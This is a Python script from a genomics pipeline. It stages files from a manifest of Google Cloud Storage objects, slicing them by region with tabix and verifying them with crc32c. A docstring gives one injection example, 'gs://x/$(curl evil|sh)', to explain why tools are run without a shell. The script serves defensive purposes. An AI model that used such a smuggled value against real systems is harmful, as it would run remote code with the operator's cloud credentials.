#!/usr/bin/env python
"""Stage baseline (v1.1.1) inputs/outputs from the frozen manifest into a local tree.

Everything is keyed off `manifests/baseline_run.json`, so a staged file is always traceable to the
exact gs:// object the v1.1.1 run read or wrote. Large bgzf inputs can be region-sliced with tabix
(`--region chr20`) so a contig-scoped replay does not need the whole genome; the slice keeps the
header and gets its own index.

    python terra/stage_inputs.py --keys rd_file pe_file sr_file median_coverage
    python terra/stage_inputs.py --attrs cutoffs median_cov genotyped_depth_vcf
    python terra/stage_inputs.py --region chr20 --attrs merged_SR merged_PE

Skips (and reports) anything already present at the same size, so re-runs are cheap. If a file is
already localized elsewhere (e.g. ~/Work/ref_panel_1kg holds the full batch evidence matrices),
pass --link-dir to have it adopted by size match instead of re-downloaded.
"""
import argparse
import base64
import glob
import json
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "kit"))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import config  # noqa: E402
import terra  # noqa: F401  E402  # no attribute is used from it: importing it is what turns a
# missing `firecloud` into one sentence about `make setup` instead of a traceback on gsutil.

HERE = os.path.dirname(os.path.abspath(__file__))
# Paths, not directories: building these at import time must not mkdir, because import is what
# `--help` executes. Everything that writes calls config.work_dir() (or os.makedirs) itself.
MAN = str(config.work_path("manifests") / "baseline_run.json")
STAGE = str(config.work_path("staging"))
# The sample_set row holding the batch-level attributes. Every sibling tool reads this key
# (batch_freeze.py, batch_rerun_step.py, batch_fetch_compare.sh, diff_rd_states.py); hardcoding
# one batch name here meant `--attrs` resolved against a row that does not exist for any other
# batch, selected nothing, and exited 0.
BATCH = config.get("BATCH", "all_samples")


def p(*a):
    print(*a, flush=True)


def run(argv, soft=False):
    """Run an external tool by argv, never through a shell.

    Not a style preference. The gs:// strings staged here are read out of Terra entity
    attributes (manifests/baseline_run.json, which fetch_baseline.py builds from a workspace
    that other people can edit), and regions come from argv. Under shell=True a value like
    gs://x/$(curl evil|sh) executes *as the operator, holding ADC for a billed project*, before
    gsutil is even reached -- and json.dumps is no defence, because it escapes quotes and
    backslashes but not '$' or a backtick, and the value lands inside double quotes where the
    shell still expands command substitution.
    """
    r = subprocess.run(list(argv), capture_output=True, text=True)
    if r.returncode != 0 and not soft:
        raise RuntimeError(" ".join(str(a) for a in argv)[:200] + "\n" + (r.stderr or "")[:600])
    return (r.stdout or "").strip()


_URI_BAD = re.compile(r"[\r\n\x00\t]")


def check_uri(uri):
    """Reject values that cannot be one GCS object name. There is no shell left to inject
    into, but a newline still corrupts `gsutil ls -l` parsing, which would silently produce a
    wrong expected size -- and a wrong expected size is how a partial download passes."""
    if _URI_BAD.search(uri):
        raise RuntimeError(f"refusing object with control characters: {uri[:60]!r}")
    return uri


# A locus, not a shell word. The leading class excludes '-' so a region cannot become a tabix
# option either.
_REGION_RE = re.compile(r"^[A-Za-z0-9_*][A-Za-z0-9_*:,.\-]*$")


def check_region(region):
    if not region or not _REGION_RE.match(str(region)):
        raise RuntimeError(f"refusing region {str(region)[:60]!r}: expected a locus such as "
                           f"chr20 or chr1:1000-2000 (no shell metacharacters, no options)")
    return region


def remote_size(uri: str) -> int:
    check_uri(uri)
    out = run(["gsutil", "-q", "ls", "-l", uri])
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[-1] == uri:
            return int(parts[0])
    raise RuntimeError(f"no size for {uri}: {out[:200]}")


def collect(manifest, keys, attrs):
    """Return {local_name: gs_uri} for requested input keys (by WDL input name) and entity attrs."""
    want = {}
    for step, sdata in manifest["steps"].items():
        for kind in ("inputs", "outputs"):
            for k, v in sdata.get(kind, {}).items():
                short = k.split(".")[-1]
                val = v.get("value") if isinstance(v, dict) else v
                if isinstance(val, str) and val.startswith("gs://") and short in keys:
                    want.setdefault(f"{step}__{kind}__{short}", val)
    ents = manifest["entities"].get("sample_set", {})
    row = ents.get(BATCH)
    if row is None:
        # A wrong GSVTK_BATCH is a configuration error, not "nothing to do", so it stops the run:
        # printing a note and returning an empty selection exited 0, which reads like an empty
        # manifest and lets a wrapper script carry on as though inputs had been staged.
        print(f"stage_inputs: no sample_set row named {BATCH!r} in {MAN} "
              f"(rows present: {', '.join(sorted(ents)) or 'none'}).\n"
              f"  set GSVTK_BATCH to one of those, or re-run\n"
              f"    python terra/fetch_baseline.py --entity {BATCH}\n"
              f"  so the manifest actually holds it.", file=sys.stderr)
        raise SystemExit(2)              # 2 = your configuration, same as a malformed --region
    for a in attrs:
        v = row.get(a)
        if isinstance(v, str) and v.startswith("gs://"):
            want.setdefault(a, v)
        elif v is not None:
            p(f"   note: attribute {a} is not a single gs:// object: {str(v)[:60]}")
        else:
            near = [k for k in sorted(row) if any(w in k.lower() for w in a.lower().split("_")) if k != a]
            p(f"   note: attribute {a} is not on sample_set {BATCH!r}"
              + (f" (similar keys: {', '.join(near[:5])})" if near else ""))
    return want


def remote_field(uri, field="crc32c"):
    """One metadata field of a gs:// object, via `gsutil stat` (metadata only, no bytes moved).

    None means "could not be read this way": no gsutil, no permission, or a composite upload, which
    has no crc32c at all. It never means "mismatch", so callers must treat it as *unverified*, not
    as a pass.
    """
    try:
        p = subprocess.run(["gsutil", "stat", uri], capture_output=True, text=True, timeout=120)
    except (OSError, subprocess.SubprocessError):
        return None
    if p.returncode != 0:
        return None
    want = "Hash (%s):" % field
    for line in (p.stdout or "").splitlines():
        if line.strip().startswith(want):
            return line.split(":", 1)[1].strip() or None
    return None


_CRC32C_POLY = 0x82F63B78            # CRC-32C (Castagnoli), reflected -- Google's crc32c.
_CRC32C_TABLE = []
for _n in range(256):
    _c = _n
    for _ in range(8):
        _c = ((_c >> 1) ^ _CRC32C_POLY) if (_c & 1) else (_c >> 1)
    _CRC32C_TABLE.append(_c & 0xFFFFFFFF)


def crc32c_b64(path, chunk=1 << 20):
    """Google crc32c of a local file, base64 -- the same form `gsutil stat` prints.

    zlib.crc32 is a DIFFERENT polynomial, so it cannot be compared with a GCS crc32c, and
    gsutil/`google-crc32c` are not guaranteed to exist here. This loop is a few MB/s, so it is only
    used under CRC_MAX_BYTES; larger files are reported as unverified rather than hashed for an hour.
    """
    crc = 0xFFFFFFFF
    with open(path, "rb") as fh:
        while True:
            buf = fh.read(chunk)
            if not buf:
                break
            for b in bytearray(buf):
                crc = (crc >> 8) ^ _CRC32C_TABLE[(crc ^ b) & 0xFF]
    return base64.b64encode(bytes.fromhex("%08x" % (crc ^ 0xFFFFFFFF))).decode()


CRC_MAX_BYTES = 64 * 1024 * 1024     # ~a few minutes of hashing; above this, say "unverified"


def verify_against_remote(local, uri, size):
    """'crc32c:ok' | 'crc32c:mismatch' | a string explaining why it could NOT be verified."""
    want = remote_field(uri, "crc32c")
    if want is None:
        return "unverified: object has no readable crc32c (composite upload, or no gsutil)"
    if size is None or size > CRC_MAX_BYTES:
        return "unverified: %s bytes exceeds the %s-byte hash budget (CRC_MAX_BYTES)"\
            % (size, CRC_MAX_BYTES)
    try:
        got = crc32c_b64(local)
    except OSError as e:
        return "unverified: could not hash %s (%s)" % (local, e)
    return "crc32c:ok" if got == want else "crc32c:mismatch (local %s != object %s)" % (got, want)


def adopt_from_local(uri, link_dirs, dest):
    """Adopt an already-localized copy by hardlink/copy -- only if it is provably the same object.

    Object names in this pipeline are stable across runs (`<batch>.depth.depth_sepcutoff.txt`,
    `<batch>.cutoffs`) and these tables are fixed-shape, so "same basename, same byte count" used to
    adopt an older capture of the same name as if it were the current baseline object -- and every
    later compare/* verdict inherited the wrong input. So now: every candidate across every
    --link-dir is collected first (more than one is an error, not a race to the first hit), and the
    one candidate must match the object's crc32c. A mismatch is treated as "this local file is not
    that object": the local copy is ignored and the real download proceeds. When the check is
    impossible the adoption still happens, but says so.
    """
    base = os.path.basename(uri)
    try:
        size = remote_size(uri)
    except Exception:
        return None
    cands = []
    for d in link_dirs:
        root = os.path.expanduser(d)
        for cand in glob.glob(os.path.join(root, "**", base), recursive=True):
            try:
                if os.path.getsize(cand) == size:
                    cands.append(cand)
            except OSError:
                continue
    if not cands:
        return None
    if len(cands) > 1:
        raise SystemExit(
            f"{len(cands)} local files are named {base} with the object's size, so adoption cannot "
            f"pick one:\n  " + "\n  ".join(sorted(cands)[:8]) +
            "\n  Narrow --link-dir to one capture, or drop --link-dir to download the object instead.")
    cand = cands[0]
    verdict = verify_against_remote(cand, uri, size)
    if verdict.startswith("crc32c:mismatch"):
        p(f"   !! NOT adopting {cand}: {verdict} -- downloading the object instead")
        return None
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    if not os.path.exists(dest):
        try:
            os.link(cand, dest)
        except OSError as e:
            # Cross-device (--link-dir on another volume) or a filesystem without hardlinks: copy
            # the local copy instead. run() takes (argv, soft=False) and raises on a nonzero rc --
            # this call used to pass check=True, so the one path that recovered from a failed
            # link died with `TypeError: run() got an unexpected keyword argument 'check'`.
            p(f"   note: cannot hardlink {os.path.basename(cand)} ({e}); copying")
            run(["gsutil", "-m", "cp", "-n", cand, dest])
    return {"source": "local", "path": cand, "size": size, "verified": verdict}


def stage_one(name, uri, region, link_dirs):
    os.makedirs(STAGE, exist_ok=True)
    base = os.path.basename(uri)
    dest = os.path.join(STAGE, base if not region else f"{region}__{name}__{base}")
    size = remote_size(uri)
    if os.path.exists(dest) and os.path.getsize(dest) == size:
        # Same size is not the same bytes -- this can be a half-finished download from the last
        # attempt. Say which it is instead of calling any same-size file "cached".
        return {"status": "cached", "local": dest, "size": size,
                "identity": "size-only: re-downloading would prove the bytes; delete the file to force it"}
    if link_dirs:
        got = adopt_from_local(uri, link_dirs, os.path.join(STAGE, base))
        if got:
            log = {"status": "adopted", "local": os.path.join(STAGE, base),
                   "adopted_from": got["path"], "size": size, "identity": got["verified"]}
            if region:
                idx = os.path.join(STAGE, base) + ".tbi"
                if not os.path.exists(idx):
                    run(["gsutil", "-m", "cp", "-n", uri + ".tbi", idx], soft=True)
                tabix_slice(os.path.join(STAGE, base), region, dest)
                log["sliced"] = dest
            return log
    if region:
        full = os.path.join(STAGE, base)
        if not (os.path.exists(full) and os.path.getsize(full) == size):
            p(f"   {name}: region slice needs the full object locally; skipping download")
            return {"status": "skipped-needs-full", "uri": uri, "size": size}
        idx = full + ".tbi"
        if not os.path.exists(idx):
            run(["gsutil", "-m", "cp", "-n", uri + ".tbi", idx], soft=True)
        tabix_slice(full, region, dest)
        return {"status": "sliced", "local": dest, "region": region, "full": full}
    run(["gsutil", "-m", "cp", "-n", uri, dest])
    if os.path.getsize(dest) != size:
        raise RuntimeError(f"size mismatch for {name}: local {os.path.getsize(dest)} != remote {size}")
    if base.endswith(".gz"):
        for ext in (".tbi", ".idx"):
            try:
                run(["gsutil", "-m", "cp", "-n", uri + ext, dest + ext])
            except Exception:
                pass
    return {"status": "downloaded", "local": dest, "size": size}


def tabix_slice(full, region, dest):
    """Region-slice a bgzf object, keeping the header. bed-style coords for matrices,
    tabix auto-detects for VCFs."""
    region = check_region(region)
    # tabix | bgzip > dest, wired with two Popen pipes instead of a shell pipeline, for the same
    # reason run() has no shell: `region` is user input and `full` derives from remote data.
    with open(dest, "wb") as out:
        src = subprocess.Popen(["tabix", "-H", full, region], stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        gz = subprocess.Popen(["bgzip", "-@4"], stdin=src.stdout, stdout=out,
                              stderr=subprocess.PIPE)
        src.stdout.close()
        gz_err = gz.communicate()[1]
        tab_err = src.communicate()[1]
    if src.returncode != 0 or gz.returncode != 0:
        # A truncated slice that later gets indexed and replayed is worse than no slice.
        if os.path.exists(dest):
            os.unlink(dest)
        raise RuntimeError("tabix/bgzip failed: "
                           + ((tab_err or b"") + (gz_err or b"")).decode("utf-8", "replace")[-400:])
    for argv in (["tabix", "-f", "-p", "bed", dest], ["bcftools", "index", "-f", dest]):
        if subprocess.run(argv, capture_output=True).returncode == 0:
            return
    p(f"   note: neither tabix nor bcftools accepted the index for {os.path.basename(dest)}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--keys", nargs="*", default=[], help="WDL input names, e.g. rd_file pe_file")
    ap.add_argument("--attrs", nargs="*", default=[], help="sample_set attribute names")
    ap.add_argument("--region", default=None, help="e.g. chr20; tabix-slice bgzf objects")
    ap.add_argument("--link-dir", action="append", default=[],
                    help="dir to adopt already-localized files from (repeatable)")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()
    if args.region is not None:
        try:
            check_region(args.region)
        except RuntimeError as e:
            p(f"!! {e}")
            sys.exit(2)

    if not os.path.exists(MAN):
        raise SystemExit(
            f"no frozen-run manifest at {MAN}.\n"
            f"  build it first:  python terra/fetch_baseline.py            "
            f"(read-only; docs/terra-head-to-head.md)")
    with open(MAN) as fh:
        manifest = json.load(fh)
    want = collect(manifest, set(args.keys), list(args.attrs))
    if not want:
        p("nothing selected; try --attrs cutoffs median_cov genotyped_depth_vcf")
        allkeys = sorted({k.split('.')[-1] for s in manifest['steps'].values()
                          for kk in ('inputs', 'outputs') for k in s.get(kk, {})})
        p(f"available input names: {allkeys}")
        return
    p(f"{len(want)} objects selected")
    log = {}
    for name, uri in sorted(want.items()):
        p(f"   {name:46s} {uri[-60:]}")
        if args.dry_run:
            continue
        try:
            log[name] = stage_one(name, uri, args.region, args.link_dir)
            p(f"      -> {log[name]['status']} {log[name].get('local','')}")
        except Exception as e:
            log[name] = {"status": "error", "error": str(e)[:300], "uri": uri}
            p(f"      !! {str(e)[:160]}")
    if not log:
        # --dry-run gets here with nothing recorded. Writing staged.json anyway would touch the
        # provenance file of a run that never happened (and needed the directory to exist).
        p("nothing staged (--dry-run); staged.json untouched")
        return
    out = os.path.join(config.work_dir("staging"), "staged.json")
    prev = {}
    if os.path.exists(out):
        prev = json.load(open(out))
    prev.update({k: {"uri": want[k], **v} for k, v in log.items()})
    json.dump(prev, open(out, "w"), indent=1, sort_keys=True)
    p(f"-> {out}")
    bad = {k: v for k, v in log.items() if v.get("status") == "error"}
    if bad:
        p(f"{len(bad)} failures")
        sys.exit(1)


if __name__ == "__main__":
    main()
